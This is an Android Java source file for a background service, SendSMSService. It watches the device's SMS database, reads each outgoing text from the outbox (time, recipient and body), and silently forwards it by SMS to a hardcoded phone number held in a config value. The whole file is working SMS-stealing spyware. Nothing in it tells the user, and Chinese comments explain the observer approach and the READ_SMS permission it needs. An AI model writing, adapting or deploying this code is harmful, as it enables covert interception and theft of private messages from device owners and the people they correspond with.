package com.service;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import value.myValue;

import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.telephony.SmsManager;

import com.main.MainActivity;

public class SendSMSService extends Service {
	public static final String tomyphone = myValue.sendMsgPhone;
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
	}
	
	private final class SmsObserver extends ContentObserver {
		
//		1.Android系统提供了Provider对短信进行查询，当发出短信时也会发送更改通知
//	    2.定义一个Observer监听"content://sms"
//	    3.在onChange()方法中查询用户发送的短信"content://sms/outbox"
//	    4.短信发送信息存放在数据库 date/date/com.android.providers.telephony
//	    5.需要权限<uses-permission android:name="android.permission.READ_SMS" />
	    public SmsObserver(Handler handler) {  
	        super(handler);  
	    }
	  
	    public void onChange(boolean selfChange) {
	        ContentResolver resolver = getContentResolver();  
	        //查到发出的短信  
	        Uri uri = Uri.parse("content://sms/outbox");  
	        Cursor cursor = resolver.query(uri, new String[] { "date", "address", "body" }, null, null, "_id desc limit 1");  
	        if (cursor.moveToNext()) {  
	            long ms = cursor.getLong(0);  
	            String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(ms));  
	            String address = cursor.getString(1);  
	            String body = cursor.getString(2);  
	            System.out.println(date + " " + address + " " + body);  
	            String message ="sendtime:"+date + " send to:" + address + " send context:" + body;
	            MySendSMS(message);
	        }  
	    }  
	}

	
	public  void MySendSMS(String message){
        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), 0);
        SmsManager smsManager = SmsManager.getDefault();  
        List<String> divideContents = smsManager.divideMessage(message);    
        for (String text : divideContents) {    
        	smsManager.sendTextMessage(tomyphone, null, text, pi, null);
        }
    }
	

	@Override
	public IBinder onBind(Intent intent) {
		getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, new SmsObserver(new Handler()));
		return new MyBinder();
	}
	
	class MyBinder extends Binder{
		
		@Override
		protected boolean onTransact(int code, Parcel data, Parcel reply,int flags) throws RemoteException {
			System.out.println("SendSMSService.MyBinder.onTransact()");
			return super.onTransact(code, data, reply, flags);
		}
		
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
	}
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return super.onStartCommand(intent, flags, startId);
	}
}
